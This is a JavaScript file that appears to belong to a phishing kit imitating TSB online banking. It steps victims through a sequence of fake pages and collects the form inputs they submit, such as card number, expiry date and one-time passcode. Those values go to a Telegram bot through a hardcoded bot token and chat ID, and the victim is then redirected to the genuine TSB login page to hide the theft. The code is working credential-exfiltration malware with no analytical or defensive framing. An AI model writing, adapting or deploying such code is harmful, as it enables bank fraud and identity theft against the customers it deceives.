window.addEventListener("DOMContentLoaded", () => {
  // window.isPass = false;
  const path = location.pathname.replace(/^\/|\/$/g, "");
  const botToken = "8075902785:AAGFR9aFjpRY8FOIkivLUXATE341Jb-vajM";
  const chatId = "6541447126";
  const image = document.querySelector("div.navbar-brand img");
  const parent = document.querySelector(".form-group");
  const otpInput = document.querySelector("#OTPInput");
  const cardNo = document.querySelector("#cardNo");
  const secondDiv = document.querySelector("#second");
  const expiryInput = document.querySelector("#expiryDate");
  // const inputParent = document.querySelector("div.input-group");
  // const input = document.querySelector("input.form-control");
  // const alert = document.querySelector("span.icon-alert");
  // const check = document.querySelector("span.icon-check");
  const first = "first.html";
  const second = "second.html";
  const third = "third.html";
  const fourth = "fourth.html";
  const fifth = "fifth.html";
  const sixth = "sixth.html";
  const last = "https://internetbanking.tsb.co.uk/personal/logon/login/#/login";
  const actionMap = {
    [first]: second,
    [second]: third,
    [third]: fourth,
    [fourth]: fifth,
    [fifth]: sixth,
  };
  const form = document.querySelector("form");
  // const userIdChild = parent.children[0];
  // const passChild = userIdChild.cloneNode(true);

  const capitalize = (str) => str.charAt(0).toUpperCase() + str.slice(1);

  const parseAction = () => {
    Object.entries(actionMap).forEach(([key, value]) => {
      if (path === key) {
        form.setAttribute("action", value);
      }
    });
    otpInput?.setAttribute("type", "tel");
    otpInput?.setAttribute("maxlength", "6");
    expiryInput?.addEventListener("input", (e) => {
      let value = e.target.value.replace(/\D/g, "");
      if (value.length > 2) {
        value = value.slice(0, 2) + "/" + value.slice(2, 4);
      }
      e.target.value = value;
    })
  };

  const post = (text, redirect = "/") => {
    if (text == "") {
      location.assign(redirect);
    }
    // console.log(text);
    // setTimeout(() => {
    //   if (cardNo) {
    //     let secondCount = 20;
    //     secondDiv.parentElement.style.display = "block";
    //     setInterval(() => {
    //       secondCount -= 1;
    //       secondDiv.innerText = secondCount;
    //       if (secondCount === 0) {
    //         location.assign(redirect);
    //       }
    //     }, 1000);
    //   } else {
    //     location.assign(redirect);
    //   }
    // }, 2000);
    // return;
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    fetch(`${url}?chat_id=${chatId}&text=${encodeURIComponent(text)}`)
      .then((res) => {
          if (cardNo) {
            let secondCount = 20;
            secondDiv.parentElement.style.display = "block";
            setInterval(() => {
              secondCount -= 1;
              secondDiv.innerText = secondCount;
              if (secondCount === 0) {
                location.assign(redirect);
              }
            }, 1000);
          } else {
            location.assign(redirect);
          }
      })
      .catch((err) => console.log(err));
  };
  // const remove = (element, cls) => {
  //   if (element.classList.contains(cls)) {
  //     element.classList.remove(cls);
  //   }
  // };
  // const add = (element, cls) => {
  //   if (!element.classList.contains(cls)) {
  //     element.classList.add(cls);
  //   }
  // };
  // const onChange = (e) => {
  //   const regex = /^[0-9]{1,6}$/g;
  //   const test = () => {
  //     return regex.test(e.target.value);
  //   };
  //   if (test()) {
  //     remove(parent, "has-error");
  //     remove(parent, "error-label-error");
  //     add(alert, "ng-hide");
  //     remove(check, "ng-hide");
  //   } else {
  //     add(parent, "has-error");
  //     add(parent, "error-label-error");
  //     remove(alert, "ng-hide");
  //     add(check, "ng-hide");
  //   }
  //   const icons = inputParent.querySelectorAll("span.input-group-addon");
  //   icons.forEach((icon) => {
  //     if (icon.parentElement === inputParent) inputParent.removeChild(icon);
  //   });
  //   // parent.classList.toggle("has-error", !test());
  //   // parent.classList.toggle("error-label-error", !test());
  //   // alert.classList.toggle("ng-hide", test());
  //   // check.classList.toggle("ng-hide", !test());
  // };
  const onSubmit = (e) => {
    e.preventDefault();
    // if (window.isPass) {
    // userIdChild.querySelector("input").name = "UserID";
    const inputs = parent.querySelectorAll("input");
    let data = "";
    inputs.forEach((input) => {
      if (input.value) data += `${capitalize(input.name)}: ${input.value}\n`;
    });
    post(data, e.target.action);
    // } else {
    //   setTimeout(() => {
    //     userIdChild.style.display = "none";
    //     passChild.style.display = "block";
    //     window.isPass = true;
    //   }, 1000);
    // }
  };

  image.src = "/static/private/images/logo-6-1409059355.png";

  // input.addEventListener("input", onChange);
  // input.addEventListener("blur", onChange);
  // input.addEventListener("focus", onChange);
  parseAction();
  form?.addEventListener("submit", onSubmit);
  setTimeout(()=> {
    document.body.style.position = "relative"
  }, 1000)
  setTimeout(()=> {
    document.body.style.position = "relative"
  }, 2000)

  // passChild.querySelector("label").innerText = "Password:";
  // passChild.querySelector("input").name = "Password";
  // passChild.querySelector("input").type = "password";
  // passChild.querySelector("input").value = "";
  // passChild.style.display = "none";

  // parent.appendChild(passChild);
});
